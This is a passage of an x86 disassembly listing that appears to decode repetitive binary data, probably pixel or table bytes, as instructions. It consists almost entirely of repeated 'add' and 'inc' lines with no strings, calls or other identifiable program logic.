  447470:	add    BYTE PTR [eax],al
  447472:	inc    DWORD PTR [eax]
  447474:	add    BYTE PTR [eax],al
  447476:	inc    DWORD PTR [eax]
  447478:	add    BYTE PTR [eax],al
  44747a:	inc    DWORD PTR [eax]
  44747c:	add    BYTE PTR [eax],al
  44747e:	inc    DWORD PTR [eax]
  447480:	add    BYTE PTR [eax],al
  447482:	inc    DWORD PTR [eax]
  447484:	add    BYTE PTR [eax],al
  447486:	inc    DWORD PTR [eax]
  447488:	add    BYTE PTR [eax],al
  44748a:	inc    DWORD PTR [eax]
  44748c:	add    BYTE PTR [eax],al
  44748e:	inc    DWORD PTR [eax]
  447490:	add    BYTE PTR [eax],al
  447492:	inc    DWORD PTR [eax]
  447494:	add    BYTE PTR [eax],al
  447496:	inc    DWORD PTR [eax]
  447498:	add    BYTE PTR [eax],al
  44749a:	inc    DWORD PTR [eax]
  44749c:	add    BYTE PTR [eax],al
  44749e:	inc    DWORD PTR [eax]
  4474a0:	add    BYTE PTR [eax],al
  4474a2:	inc    DWORD PTR [eax]
  4474a4:	add    BYTE PTR [eax],al
  4474a6:	inc    DWORD PTR [eax]
  4474a8:	add    BYTE PTR [eax],al
  4474aa:	inc    DWORD PTR [eax]
  4474ac:	add    BYTE PTR [eax],al
  4474ae:	inc    DWORD PTR [eax]
  4474b0:	add    BYTE PTR [eax],al
  4474b2:	inc    DWORD PTR [eax]
  4474b4:	add    BYTE PTR [eax],al
  4474b6:	inc    DWORD PTR [eax]
  4474b8:	add    BYTE PTR [eax],al
  4474ba:	inc    DWORD PTR [eax]
  4474bc:	add    BYTE PTR [eax],al
  4474be:	inc    DWORD PTR [eax]
  4474c0:	add    BYTE PTR [eax],al
  4474c2:	inc    DWORD PTR [eax]
  4474c4:	add    BYTE PTR [eax],al
  4474c6:	inc    DWORD PTR [eax]
  4474c8:	add    BYTE PTR [eax],al
  4474ca:	inc    DWORD PTR [eax]
  4474cc:	add    BYTE PTR [eax],al
  4474ce:	inc    DWORD PTR [eax]
  4474d0:	add    BYTE PTR [eax],al
  4474d2:	inc    DWORD PTR [eax]
  4474d4:	add    BYTE PTR [eax],al
  4474d6:	inc    DWORD PTR [eax]
  4474d8:	add    BYTE PTR [eax],al
  4474da:	inc    DWORD PTR [eax]
  4474dc:	add    BYTE PTR [eax],al
  4474de:	inc    DWORD PTR [eax]
  4474e0:	add    BYTE PTR [eax],al
  4474e2:	inc    DWORD PTR [eax]
  4474e4:	add    BYTE PTR [eax],al
  4474e6:	inc    DWORD PTR [eax]
  4474e8:	add    BYTE PTR [eax],al
  4474ea:	inc    DWORD PTR [eax]
  4474ec:	add    BYTE PTR [eax],al
  4474ee:	inc    DWORD PTR [eax]
  4474f0:	add    BYTE PTR [eax],al
  4474f2:	inc    DWORD PTR [eax]
  4474f4:	add    BYTE PTR [eax],al
  4474f6:	inc    DWORD PTR [eax]
  4474f8:	add    BYTE PTR [eax],al
  4474fa:	inc    DWORD PTR [eax]
  4474fc:	add    BYTE PTR [eax],al
  4474fe:	inc    DWORD PTR [eax]
  447500:	add    BYTE PTR [eax],al
  447502:	inc    DWORD PTR [eax]
  447504:	add    BYTE PTR [eax],al
  447506:	inc    DWORD PTR [eax]
  447508:	add    BYTE PTR [eax],al
  44750a:	inc    DWORD PTR [eax]
  44750c:	add    BYTE PTR [eax],al
  44750e:	inc    DWORD PTR [eax]
  447510:	add    BYTE PTR [eax],al
  447512:	inc    DWORD PTR [eax]
  447514:	add    BYTE PTR [eax],al
  447516:	inc    DWORD PTR [eax]
  447518:	add    BYTE PTR [eax],al
  44751a:	inc    DWORD PTR [eax]
  44751c:	add    BYTE PTR [eax],al
  44751e:	inc    DWORD PTR [eax]
  447520:	add    BYTE PTR [eax],al
  447522:	inc    DWORD PTR [eax]
  447524:	add    BYTE PTR [eax],al
  447526:	inc    DWORD PTR [eax]
  447528:	add    BYTE PTR [eax],al
  44752a:	inc    DWORD PTR [eax]
  44752c:	add    BYTE PTR [eax],al
  44752e:	inc    DWORD PTR [eax]
  447530:	add    BYTE PTR [eax],al
  447532:	inc    DWORD PTR [eax]
  447534:	add    BYTE PTR [eax],al
  447536:	inc    DWORD PTR [eax]
  447538:	add    BYTE PTR [eax],al
  44753a:	inc    DWORD PTR [eax]
  44753c:	add    BYTE PTR [eax],al
  44753e:	inc    DWORD PTR [eax]
  447540:	add    BYTE PTR [eax],al
  447542:	inc    DWORD PTR [edi+0x41]
  447545:	inc    ecx
  447546:	push   edx
  447547:	dec    edx
  447548:	cmp    bh,BYTE PTR [edx]
  44754a:	xor    BYTE PTR ds:0xfe0404,al
  447550:	add    BYTE PTR [eax],al
  447552:	inc    DWORD PTR [eax]
  447554:	add    BYTE PTR [eax],al
  447556:	inc    DWORD PTR [eax]
  447558:	add    BYTE PTR [eax],al
  44755a:	inc    DWORD PTR [eax]
  44755c:	add    BYTE PTR [eax],al
  44755e:	inc    DWORD PTR [eax]
  447560:	add    BYTE PTR [eax],al
  447562:	inc    DWORD PTR [eax]
  447564:	add    BYTE PTR [eax],al
  447566:	inc    DWORD PTR [eax]
  447568:	add    BYTE PTR [eax],al
  44756a:	inc    DWORD PTR [eax]
  44756c:	add    BYTE PTR [eax],al
  44756e:	inc    DWORD PTR [eax]
  447570:	add    BYTE PTR [eax],al
  447572:	inc    DWORD PTR [eax]
  447574:	add    BYTE PTR [eax],al
  447576:	inc    DWORD PTR [eax]
  447578:	add    BYTE PTR [eax],al
  44757a:	inc    DWORD PTR [eax]
  44757c:	add    BYTE PTR [eax],al
  44757e:	inc    DWORD PTR [eax]
  447580:	add    BYTE PTR [eax],al
  447582:	inc    DWORD PTR [eax]
  447584:	add    BYTE PTR [eax],al
  447586:	inc    DWORD PTR [eax]
  447588:	add    BYTE PTR [eax],al
  44758a:	inc    DWORD PTR [eax]
  44758c:	add    BYTE PTR [eax],al
  44758e:	inc    DWORD PTR [eax]
  447590:	add    BYTE PTR [eax],al
  447592:	inc    DWORD PTR [eax]
  447594:	add    BYTE PTR [eax],al
  447596:	inc    DWORD PTR [eax]
  447598:	add    BYTE PTR [eax],al
  44759a:	inc    DWORD PTR [eax]
  44759c:	add    BYTE PTR [eax],al
  44759e:	inc    DWORD PTR [eax]
  4475a0:	add    BYTE PTR [eax],al
  4475a2:	inc    DWORD PTR [eax]
  4475a4:	add    BYTE PTR [eax],al
  4475a6:	inc    DWORD PTR [eax]
  4475a8:	add    BYTE PTR [eax],al
  4475aa:	inc    DWORD PTR [eax]
  4475ac:	add    BYTE PTR [eax],al
  4475ae:	inc    DWORD PTR [eax]
  4475b0:	add    BYTE PTR [eax],al
  4475b2:	inc    DWORD PTR [eax]
  4475b4:	add    BYTE PTR [eax],al
  4475b6:	inc    DWORD PTR [eax]
  4475b8:	add    BYTE PTR [eax],al
  4475ba:	inc    DWORD PTR [eax]
  4475bc:	add    BYTE PTR [eax],al
  4475be:	inc    DWORD PTR [eax]
  4475c0:	add    BYTE PTR [eax],al
  4475c2:	inc    DWORD PTR [eax]
  4475c4:	add    BYTE PTR [eax],al
  4475c6:	inc    DWORD PTR [eax]
  4475c8:	add    BYTE PTR [eax],al
  4475ca:	inc    DWORD PTR [eax]
  4475cc:	add    BYTE PTR [eax],al
  4475ce:	inc    DWORD PTR [eax]
  4475d0:	add    BYTE PTR [eax],al
  4475d2:	inc    DWORD PTR [eax]
  4475d4:	add    BYTE PTR [eax],al
  4475d6:	inc    DWORD PTR [eax]
  4475d8:	add    BYTE PTR [eax],al
  4475da:	inc    DWORD PTR [eax]
  4475dc:	add    BYTE PTR [eax],al
  4475de:	inc    DWORD PTR [eax]
  4475e0:	add    BYTE PTR [eax],al
  4475e2:	inc    DWORD PTR [eax]
  4475e4:	add    BYTE PTR [eax],al
  4475e6:	inc    DWORD PTR [eax]
  4475e8:	add    BYTE PTR [eax],al
  4475ea:	inc    DWORD PTR [eax]
  4475ec:	add    BYTE PTR [eax],al
  4475ee:	inc    DWORD PTR [eax]
  4475f0:	add    BYTE PTR [eax],al
  4475f2:	inc    DWORD PTR [eax]
  4475f4:	add    BYTE PTR [eax],al
  4475f6:	inc    DWORD PTR [eax]
  4475f8:	add    BYTE PTR [eax],al
  4475fa:	inc    DWORD PTR [eax]
  4475fc:	add    BYTE PTR [eax],al
  4475fe:	inc    DWORD PTR [eax]
  447600:	add    BYTE PTR [eax],al
  447602:	inc    DWORD PTR [eax]
  447604:	add    BYTE PTR [eax],al
  447606:	inc    DWORD PTR [eax]
  447608:	add    BYTE PTR [eax],al
  44760a:	inc    DWORD PTR [eax]
  44760c:	add    BYTE PTR [eax],al
  44760e:	inc    DWORD PTR [eax]
  447610:	add    BYTE PTR [eax],al
  447612:	inc    DWORD PTR [eax]
  447614:	add    BYTE PTR [eax],al
  447616:	inc    DWORD PTR [eax]
  447618:	add    BYTE PTR [eax],al
  44761a:	inc    DWORD PTR [eax]
  44761c:	add    BYTE PTR [eax],al
  44761e:	inc    DWORD PTR [eax]
  447620:	add    BYTE PTR [eax],al
  447622:	inc    DWORD PTR [eax]
  447624:	add    BYTE PTR [eax],al
  447626:	inc    DWORD PTR [eax]
  447628:	add    BYTE PTR [eax],al
  44762a:	inc    DWORD PTR [eax]
  44762c:	add    BYTE PTR [eax],al
  44762e:	inc    DWORD PTR [eax]
  447630:	add    BYTE PTR [eax],al
  447632:	inc    DWORD PTR [eax]
  447634:	add    BYTE PTR [eax],al
  447636:	inc    DWORD PTR [eax]
  447638:	add    BYTE PTR [eax],al
  44763a:	inc    DWORD PTR [eax]
  44763c:	add    BYTE PTR [eax],al
  44763e:	inc    DWORD PTR [eax]
  447640:	add    BYTE PTR [eax],al
  447642:	inc    DWORD PTR [eax]
  447644:	add    BYTE PTR [eax],al
  447646:	inc    DWORD PTR [eax]
  447648:	add    BYTE PTR [eax],al
  44764a:	inc    DWORD PTR [eax]
  44764c:	add    BYTE PTR [eax],al
  44764e:	inc    DWORD PTR [eax]
  447650:	add    BYTE PTR [eax],al
  447652:	inc    DWORD PTR [eax]
  447654:	add    BYTE PTR [eax],al
  447656:	inc    DWORD PTR [eax]
  447658:	add    BYTE PTR [eax],al
  44765a:	inc    DWORD PTR [eax]
  44765c:	add    BYTE PTR [eax],al
  44765e:	inc    DWORD PTR [eax]
  447660:	add    BYTE PTR [eax],al
  447662:	inc    DWORD PTR [eax]
  447664:	add    BYTE PTR [eax],al
  447666:	inc    DWORD PTR [eax]
  447668:	add    BYTE PTR [eax],al
  44766a:	inc    DWORD PTR [eax]
  44766c:	add    BYTE PTR [eax],al
  44766e:	inc    DWORD PTR [eax]
  447670:	add    BYTE PTR [eax],al
  447672:	inc    DWORD PTR [eax]
  447674:	add    BYTE PTR [eax],al
  447676:	inc    DWORD PTR [eax]
  447678:	add    BYTE PTR [eax],al
  44767a:	inc    DWORD PTR [eax]
  44767c:	add    BYTE PTR [eax],al
  44767e:	inc    DWORD PTR [eax]
  447680:	add    BYTE PTR [eax],al
  447682:	inc    DWORD PTR [eax]
  447684:	add    BYTE PTR [eax],al
  447686:	inc    DWORD PTR [eax]
  447688:	add    BYTE PTR [eax],al
  44768a:	inc    DWORD PTR [eax]
  44768c:	add    BYTE PTR [eax],al
  44768e:	inc    DWORD PTR [eax]
  447690:	add    BYTE PTR [eax],al
  447692:	inc    DWORD PTR [eax]
  447694:	add    BYTE PTR [eax],al
  447696:	inc    DWORD PTR [eax]
  447698:	add    BYTE PTR [eax],al
  44769a:	inc    DWORD PTR [eax]
  44769c:	add    BYTE PTR [eax],al
  44769e:	inc    DWORD PTR [eax]
  4476a0:	add    BYTE PTR [eax],al
  4476a2:	inc    DWORD PTR [eax]
  4476a4:	add    BYTE PTR [eax],al
  4476a6:	inc    DWORD PTR [eax]
  4476a8:	add    BYTE PTR [eax],al
  4476aa:	inc    DWORD PTR [eax]
  4476ac:	add    BYTE PTR [eax],al
  4476ae:	inc    DWORD PTR [eax]
  4476b0:	add    BYTE PTR [eax],al
  4476b2:	inc    DWORD PTR [eax]
  4476b4:	add    BYTE PTR [eax],al
  4476b6:	inc    DWORD PTR [eax]
  4476b8:	add    BYTE PTR [eax],al
  4476ba:	inc    DWORD PTR [eax]
  4476bc:	add    BYTE PTR [eax],al
  4476be:	inc    DWORD PTR [eax]
  4476c0:	add    BYTE PTR [eax],al
  4476c2:	inc    DWORD PTR [eax]
  4476c4:	add    BYTE PTR [eax],al
  4476c6:	inc    DWORD PTR [eax]
  4476c8:	add    BYTE PTR [eax],al
  4476ca:	inc    DWORD PTR [eax]
  4476cc:	add    BYTE PTR [eax],al
  4476ce:	inc    DWORD PTR [eax]
  4476d0:	add    BYTE PTR [eax],al
  4476d2:	inc    DWORD PTR [eax]
  4476d4:	add    BYTE PTR [eax],al
  4476d6:	inc    DWORD PTR [eax]
  4476d8:	add    BYTE PTR [eax],al
  4476da:	inc    DWORD PTR [eax]
  4476dc:	add    BYTE PTR [eax],al
  4476de:	inc    DWORD PTR [eax]
  4476e0:	add    BYTE PTR [eax],al
  4476e2:	inc    DWORD PTR [eax]
  4476e4:	add    BYTE PTR [eax],al
  4476e6:	inc    DWORD PTR [eax]
  4476e8:	add    BYTE PTR [eax],al
  4476ea:	inc    DWORD PTR [eax]
  4476ec:	add    BYTE PTR [eax],al
  4476ee:	inc    DWORD PTR [eax]
  4476f0:	add    BYTE PTR [eax],al
  4476f2:	inc    DWORD PTR [eax]
  4476f4:	add    BYTE PTR [eax],al
  4476f6:	inc    DWORD PTR [eax]
  4476f8:	add    BYTE PTR [eax],al
  4476fa:	inc    DWORD PTR [eax]
  4476fc:	add    BYTE PTR [eax],al
  4476fe:	inc    DWORD PTR [eax]
  447700:	add    BYTE PTR [eax],al
  447702:	inc    DWORD PTR [eax]
  447704:	add    BYTE PTR [eax],al
  447706:	inc    DWORD PTR [eax]
  447708:	add    BYTE PTR [eax],al
  44770a:	inc    DWORD PTR [eax]
  44770c:	add    BYTE PTR [eax],al
  44770e:	inc    DWORD PTR [eax]
  447710:	add    BYTE PTR [eax],al
  447712:	inc    DWORD PTR [eax]
  447714:	add    BYTE PTR [eax],al
  447716:	inc    DWORD PTR [eax]
  447718:	add    BYTE PTR [eax],al
  44771a:	inc    DWORD PTR [eax]
  44771c:	add    BYTE PTR [eax],al
  44771e:	inc    DWORD PTR [eax]
  447720:	add    BYTE PTR [eax],al
  447722:	inc    DWORD PTR [eax]
  447724:	add    BYTE PTR [eax],al
  447726:	inc    DWORD PTR [eax]
  447728:	add    BYTE PTR [eax],al
  44772a:	inc    DWORD PTR [eax]
  44772c:	add    BYTE PTR [eax],al
  44772e:	inc    DWORD PTR [eax]
  447730:	add    BYTE PTR [eax],al
  447732:	inc    DWORD PTR [eax]
  447734:	add    BYTE PTR [eax],al
  447736:	inc    DWORD PTR [eax]
  447738:	add    BYTE PTR [eax],al
  44773a:	inc    DWORD PTR [eax]
  44773c:	add    BYTE PTR [eax],al
  44773e:	jmp    DWORD PTR [edi]
  447740:	and    al,0x24
  447742:	out    dx,eax
  447743:	enter  0xb6a3,0xe
  447747:	mov    dh,0xa3
  447749:	mov    ds:0x2b2b320e,eax
  44774e:	mov    ebx,0xff000000
  447753:	add    BYTE PTR [eax],al
  447755:	add    bh,bh
  447757:	add    BYTE PTR [eax],al
  447759:	add    bh,bh
  44775b:	add    BYTE PTR [eax],al
  44775d:	add    bh,bh
  44775f:	add    BYTE PTR [eax],al
  447761:	add    bh,bh
  447763:	add    BYTE PTR [eax],al
  447765:	add    bh,bh
  447767:	add    BYTE PTR [eax],al
  447769:	add    bh,bh
  44776b:	add    BYTE PTR [eax],al
  44776d:	add    bh,bh
  44776f:	add    BYTE PTR [eax],al
  447771:	add    bh,bh
  447773:	add    BYTE PTR [eax],al
  447775:	add    bh,bh
  447777:	add    BYTE PTR [eax],al
  447779:	add    bh,bh
  44777b:	add    BYTE PTR [eax],al
  44777d:	add    bh,bh
  44777f:	add    BYTE PTR [eax],al
  447781:	add    bh,bh
  447783:	add    BYTE PTR [eax],al
  447785:	add    bh,bh
  447787:	add    BYTE PTR [eax],al
  447789:	add    bh,bh
  44778b:	add    BYTE PTR [eax],al
  44778d:	add    bh,bh
  44778f:	add    BYTE PTR [eax],al
  447791:	add    bh,bh
  447793:	add    BYTE PTR [eax],al
  447795:	add    bh,bh
  447797:	add    BYTE PTR [eax],al
  447799:	add    bh,bh
  44779b:	add    BYTE PTR [eax],al
  44779d:	add    bh,bh
  44779f:	add    BYTE PTR [eax],al
  4477a1:	add    bh,bh
  4477a3:	add    BYTE PTR [eax],al
  4477a5:	add    bh,bh
  4477a7:	add    BYTE PTR [eax],al
  4477a9:	add    bh,bh
  4477ab:	add    BYTE PTR [eax],al
  4477ad:	add    bh,bh
  4477af:	add    BYTE PTR [eax],al
  4477b1:	add    bh,bh
  4477b3:	add    BYTE PTR [eax],al
  4477b5:	add    bh,bh
  4477b7:	add    BYTE PTR [eax],al
  4477b9:	add    bh,bh
  4477bb:	add    BYTE PTR [eax],al
  4477bd:	add    bh,bh
  4477bf:	add    BYTE PTR [eax],al
  4477c1:	add    bh,bh
  4477c3:	add    BYTE PTR [eax],al
  4477c5:	add    bh,bh
  4477c7:	add    BYTE PTR [eax],al
  4477c9:	add    bh,bh
  4477cb:	add    BYTE PTR [eax],al
  4477cd:	add    bh,bh
  4477cf:	add    BYTE PTR [eax],al
  4477d1:	add    bh,bh
  4477d3:	add    BYTE PTR [eax],al
  4477d5:	add    bh,bh
  4477d7:	add    BYTE PTR [eax],al
  4477d9:	add    bh,bh
  4477db:	add    BYTE PTR [eax],al
  4477dd:	add    bh,bh
  4477df:	add    BYTE PTR [eax],al
  4477e1:	add    bh,bh
  4477e3:	add    BYTE PTR [eax],al
  4477e5:	add    bh,bh
  4477e7:	add    BYTE PTR [eax],al
  4477e9:	add    bh,bh
  4477eb:	add    BYTE PTR [eax],al
  4477ed:	add    bh,bh
  4477ef:	add    BYTE PTR [eax],al
  4477f1:	add    bh,bh
  4477f3:	add    BYTE PTR [eax],al
  4477f5:	add    bh,bh
  4477f7:	add    BYTE PTR [eax],al
  4477f9:	add    bh,bh
  4477fb:	add    BYTE PTR [eax],al
  4477fd:	add    bh,bh
  4477ff:	add    BYTE PTR [eax],al
  447801:	add    bh,bh
  447803:	add    BYTE PTR [eax],al
  447805:	add    bh,bh
  447807:	add    BYTE PTR [eax],al
  447809:	add    bh,bh
  44780b:	add    BYTE PTR [eax],al
  44780d:	add    bh,bh
  44780f:	add    BYTE PTR [eax],al
  447811:	add    bh,bh
  447813:	add    BYTE PTR [eax],al
  447815:	add    bh,bh
  447817:	add    BYTE PTR [eax],al
  447819:	add    bh,bh
  44781b:	add    BYTE PTR [eax],al
  44781d:	add    bh,bh
  44781f:	add    BYTE PTR [eax],al
  447821:	add    bh,bh
  447823:	add    BYTE PTR [eax],al
  447825:	add    bh,bh
  447827:	add    BYTE PTR [eax],al
  447829:	add    bh,bh
  44782b:	add    BYTE PTR [eax],al
  44782d:	add    bh,bh
  44782f:	add    BYTE PTR [eax],al
  447831:	add    bh,bh
  447833:	add    BYTE PTR [eax],al
  447835:	add    bh,bh
  447837:	add    BYTE PTR [eax],al
  447839:	add    bh,bh
  44783b:	add    BYTE PTR [eax],al
  44783d:	add    bh,bh
  44783f:	add    BYTE PTR [eax],al
  447841:	add    bh,bh
  447843:	add    BYTE PTR [eax],al
  447845:	add    bh,bh
  447847:	add    BYTE PTR [eax],al
  447849:	add    bh,bh
  44784b:	add    BYTE PTR [eax],al
  44784d:	add    bh,bh
  44784f:	add    BYTE PTR [eax],al
  447851:	add    bh,bh
  447853:	add    BYTE PTR [eax],al
  447855:	add    bh,bh
  447857:	add    BYTE PTR [eax],al
  447859:	add    bh,bh
  44785b:	add    BYTE PTR [eax],al
  44785d:	add    bh,bh
  44785f:	add    BYTE PTR [eax],al
  447861:	add    bh,bh
  447863:	add    BYTE PTR [eax],al
  447865:	add    bh,bh
  447867:	add    BYTE PTR [eax],al
  447869:	add    bh,bh
  44786b:	add    BYTE PTR [eax],al
  44786d:	add    bh,bh
  44786f:	add    BYTE PTR [eax],al
  447871:	add    bh,bh
  447873:	add    BYTE PTR [eax],al
  447875:	add    bh,bh
  447877:	add    BYTE PTR [eax],al
  447879:	add    bh,bh
  44787b:	add    BYTE PTR [eax],al
  44787d:	add    bh,bh
  44787f:	add    BYTE PTR [eax],al
  447881:	add    bh,bh
  447883:	add    BYTE PTR [eax],al
  447885:	add    bh,bh
  447887:	add    BYTE PTR [eax],al
  447889:	add    bh,bh
  44788b:	add    BYTE PTR [eax],al
  44788d:	add    bh,bh
  44788f:	add    BYTE PTR [eax],al
  447891:	add    bh,bh
  447893:	add    BYTE PTR [eax],al
  447895:	add    bh,bh
  447897:	add    BYTE PTR [eax],al
  447899:	add    bh,bh
  44789b:	add    BYTE PTR [eax],al
  44789d:	add    bh,bh
  44789f:	add    BYTE PTR [eax],al
  4478a1:	add    bh,bh
  4478a3:	add    BYTE PTR [eax],al
  4478a5:	add    bh,bh
  4478a7:	add    BYTE PTR [eax],al
  4478a9:	add    bh,bh
  4478ab:	add    BYTE PTR [eax],al
  4478ad:	add    bh,bh
  4478af:	add    BYTE PTR [eax],al
  4478b1:	add    bh,bh
  4478b3:	add    BYTE PTR [eax],al
  4478b5:	add    bh,bh
  4478b7:	add    BYTE PTR [eax],al
  4478b9:	add    bh,bh
  4478bb:	add    BYTE PTR [eax],al
  4478bd:	add    bh,bh
  4478bf:	add    BYTE PTR [eax],al
  4478c1:	add    bh,bh
  4478c3:	add    BYTE PTR [eax],al
  4478c5:	add    bh,bh
  4478c7:	add    BYTE PTR [eax],al
  4478c9:	add    bh,bh
  4478cb:	add    BYTE PTR [eax],al
  4478cd:	add    bh,bh
  4478cf:	add    BYTE PTR [eax],al
  4478d1:	add    bh,bh
  4478d3:	add    BYTE PTR [eax],al
  4478d5:	add    bh,bh
  4478d7:	add    BYTE PTR [eax],al
  4478d9:	add    bh,bh
  4478db:	add    BYTE PTR [eax],al
  4478dd:	add    bh,bh
  4478df:	add    BYTE PTR [eax],al
  4478e1:	add    bh,bh
  4478e3:	add    BYTE PTR [eax],al
  4478e5:	add    bh,bh
  4478e7:	add    BYTE PTR [eax],al
  4478e9:	add    bh,bh
  4478eb:	add    BYTE PTR [eax],al
  4478ed:	add    bh,bh
  4478ef:	add    BYTE PTR [eax],al
  4478f1:	add    bh,bh
  4478f3:	add    BYTE PTR [eax],al
  4478f5:	add    bh,bh
  4478f7:	add    BYTE PTR [eax],al
  4478f9:	add    bh,bh
  4478fb:	add    BYTE PTR [eax],al
  4478fd:	add    bh,bh
  4478ff:	add    BYTE PTR [eax],al
  447901:	add    bh,bh
  447903:	add    BYTE PTR [eax],al
  447905:	add    bh,bh
  447907:	add    BYTE PTR [eax],al
  447909:	add    bh,bh
  44790b:	add    BYTE PTR [eax],al
  44790d:	add    bh,bh
  44790f:	add    BYTE PTR [eax],al
  447911:	add    bh,bh
  447913:	add    BYTE PTR [eax],al
  447915:	add    bh,bh
  447917:	add    BYTE PTR [eax],al
  447919:	add    bh,bh
  44791b:	add    BYTE PTR [eax],al
  44791d:	add    bh,bh
  44791f:	add    BYTE PTR [eax],al
  447921:	add    bh,bh
  447923:	add    BYTE PTR [eax],al
  447925:	add    bh,bh
  447927:	add    BYTE PTR [eax],al
  447929:	add    bh,bh
  44792b:	add    BYTE PTR [eax],al
  44792d:	add    bh,bh
  44792f:	add    BYTE PTR [eax],al
  447931:	add    bh,bh
  447933:	add    BYTE PTR [eax],al
  447935:	add    bh,bh
  447937:	add    BYTE PTR [eax],al
  447939:	add    bh,bh
  44793b:	add    BYTE PTR [eax],al
  44793d:	add    bh,bh
  44793f:	inc    esp
  447940:	cmp    DWORD PTR [ecx],edi
  447942:	pop    ecx
  447943:	enter  0xb6a3,0xe
  447947:	mov    ds:0x3f0e9191,eax
  44794c:	aas    
  44794d:	aas    
  44794e:	or     al,0x1f
  447950:	sbb    eax,0xf41c
  447955:	add    bh,bh
  447957:	add    BYTE PTR [eax],al
  447959:	add    bh,bh
  44795b:	add    BYTE PTR [eax],al
  44795d:	add    bh,bh
  44795f:	add    BYTE PTR [eax],al
  447961:	add    bh,bh
  447963:	add    BYTE PTR [eax],al
  447965:	add    bh,bh
  447967:	add    BYTE PTR [eax],al
  447969:	add    bh,bh
  44796b:	add    BYTE PTR [eax],al
  44796d:	add    bh,bh
  44796f:	add    BYTE PTR [eax],al
  447971:	add    bh,bh
  447973:	add    BYTE PTR [eax],al
  447975:	add    bh,bh
  447977:	add    BYTE PTR [eax],al
  447979:	add    bh,bh
  44797b:	add    BYTE PTR [eax],al
  44797d:	add    bh,bh
  44797f:	add    BYTE PTR [eax],al
  447981:	add    bh,bh
  447983:	add    BYTE PTR [eax],al
  447985:	add    bh,bh
  447987:	add    BYTE PTR [eax],al
  447989:	add    bh,bh
  44798b:	add    BYTE PTR [eax],al
  44798d:	add    bh,bh
  44798f:	add    BYTE PTR [eax],al
  447991:	add    bh,bh
  447993:	add    BYTE PTR [eax],al
  447995:	add    bh,bh
  447997:	add    BYTE PTR [eax],al
  447999:	add    bh,bh
  44799b:	add    BYTE PTR [eax],al
  44799d:	add    bh,bh
  44799f:	add    BYTE PTR [eax],al
  4479a1:	add    bh,bh
  4479a3:	add    BYTE PTR [eax],al
  4479a5:	add    bh,bh
  4479a7:	add    BYTE PTR [eax],al
  4479a9:	add    bh,bh
  4479ab:	add    BYTE PTR [eax],al
  4479ad:	add    bh,bh
  4479af:	add    BYTE PTR [eax],al
  4479b1:	add    bh,bh
  4479b3:	add    BYTE PTR [eax],al
  4479b5:	add    bh,bh
  4479b7:	add    BYTE PTR [eax],al
  4479b9:	add    bh,bh
  4479bb:	add    BYTE PTR [eax],al
  4479bd:	add    bh,bh
  4479bf:	add    BYTE PTR [eax],al
  4479c1:	add    bh,bh
  4479c3:	add    BYTE PTR [eax],al
  4479c5:	add    bh,bh
  4479c7:	add    BYTE PTR [eax],al
  4479c9:	add    bh,bh
  4479cb:	add    BYTE PTR [eax],al
  4479cd:	add    bh,bh
  4479cf:	add    BYTE PTR [eax],al
  4479d1:	add    bh,bh
  4479d3:	add    BYTE PTR [eax],al
  4479d5:	add    bh,bh
  4479d7:	add    BYTE PTR [eax],al
  4479d9:	add    bh,bh
  4479db:	add    BYTE PTR [eax],al
  4479dd:	add    bh,bh
  4479df:	add    BYTE PTR [eax],al
  4479e1:	add    bh,bh
  4479e3:	add    BYTE PTR [eax],al
  4479e5:	add    bh,bh
  4479e7:	add    BYTE PTR [eax],al
  4479e9:	add    bh,bh
  4479eb:	add    BYTE PTR [eax],al
  4479ed:	add    bh,bh
  4479ef:	add    BYTE PTR [eax],al
  4479f1:	add    bh,bh
  4479f3:	add    BYTE PTR [eax],al
  4479f5:	add    bh,bh
  4479f7:	add    BYTE PTR [eax],al
  4479f9:	add    bh,bh
  4479fb:	add    BYTE PTR [eax],al
  4479fd:	add    bh,bh
  4479ff:	add    BYTE PTR [eax],al
  447a01:	add    bh,bh
  447a03:	add    BYTE PTR [eax],al
  447a05:	add    bh,bh
  447a07:	add    BYTE PTR [eax],al
  447a09:	add    bh,bh
  447a0b:	add    BYTE PTR [eax],al
  447a0d:	add    bh,bh
  447a0f:	add    BYTE PTR [eax],al
  447a11:	add    bh,bh
  447a13:	add    BYTE PTR [eax],al
  447a15:	add    bh,bh
  447a17:	add    BYTE PTR [eax],al
  447a19:	add    bh,bh
  447a1b:	add    BYTE PTR [eax],al
  447a1d:	add    bh,bh
  447a1f:	add    BYTE PTR [eax],al
  447a21:	add    bh,bh
  447a23:	add    BYTE PTR [eax],al
  447a25:	add    bh,bh
  447a27:	add    BYTE PTR [eax],al
  447a29:	add    bh,bh
  447a2b:	add    BYTE PTR [eax],al
  447a2d:	add    bh,bh
  447a2f:	add    BYTE PTR [eax],al
  447a31:	add    bh,bh
  447a33:	add    BYTE PTR [eax],al
  447a35:	add    bh,bh
  447a37:	add    BYTE PTR [eax],al
  447a39:	add    bh,bh
  447a3b:	add    BYTE PTR [eax],al
  447a3d:	add    bh,bh
  447a3f:	add    BYTE PTR [eax],al
  447a41:	add    bh,bh
  447a43:	add    BYTE PTR [eax],al
  447a45:	add    bh,bh
  447a47:	add    BYTE PTR [eax],al
  447a49:	add    bh,bh
  447a4b:	add    BYTE PTR [eax],al
  447a4d:	add    bh,bh
  447a4f:	add    BYTE PTR [eax],al
  447a51:	add    bh,bh
  447a53:	add    BYTE PTR [eax],al
  447a55:	add    bh,bh
  447a57:	add    BYTE PTR [eax],al
  447a59:	add    bh,bh
  447a5b:	add    BYTE PTR [eax],al
  447a5d:	add    bh,bh
  447a5f:	add    BYTE PTR [eax],al
  447a61:	add    bh,bh
  447a63:	add    BYTE PTR [eax],al
  447a65:	add    bh,bh
  447a67:	add    BYTE PTR [eax],al
  447a69:	add    bh,bh
  447a6b:	add    BYTE PTR [eax],al
  447a6d:	add    bh,bh
  447a6f:	add    BYTE PTR [eax],al
  447a71:	add    bh,bh
  447a73:	add    BYTE PTR [eax],al
  447a75:	add    bh,bh
  447a77:	add    BYTE PTR [eax],al
  447a79:	add    bh,bh
  447a7b:	add    BYTE PTR [eax],al
  447a7d:	add    bh,bh
  447a7f:	add    BYTE PTR [eax],al
  447a81:	add    bh,bh
  447a83:	add    BYTE PTR [eax],al
  447a85:	add    bh,bh
  447a87:	add    BYTE PTR [eax],al
  447a89:	add    bh,bh
  447a8b:	add    BYTE PTR [eax],al
  447a8d:	add    bh,bh
  447a8f:	add    BYTE PTR [eax],al
  447a91:	add    bh,bh
  447a93:	add    BYTE PTR [eax],al
  447a95:	add    bh,bh
  447a97:	add    BYTE PTR [eax],al
  447a99:	add    bh,bh
  447a9b:	add    BYTE PTR [eax],al
